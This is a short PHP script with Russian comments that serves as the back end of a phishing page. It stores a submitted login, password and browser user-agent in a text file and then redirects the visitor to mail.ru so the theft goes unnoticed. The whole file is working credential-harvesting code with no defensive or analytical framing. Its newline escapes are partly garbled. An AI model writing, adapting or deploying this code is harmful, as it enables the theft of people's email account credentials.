<?php
    // введенный логин
    $login = $_POST['Login'];        
    // браузер пользователя                         
    $browser = getenv("HTTP_USER_AGENT"); 	
    // Пароль
    $pass = $_POST['Password']; 			      

    // Записываем полученные данные
    $text = "Login = $loginnPassword = $passnBrowser = $browser";

    // открываем файл 
    $filelog = fopen("ups.txt","a+"); 	
    // записываем строку	 
    fwrite($filelog,"n $text n"); 		         
    fclose($filelog); 					  // закрываем

   
header("Location: http://mail.ru"); //куда перенавравиться пользователь после ввода данных
echo "<META HTTP-EQUIV=\"Refresh\" content =\"0; URL=http://mail.ru\">"
?>
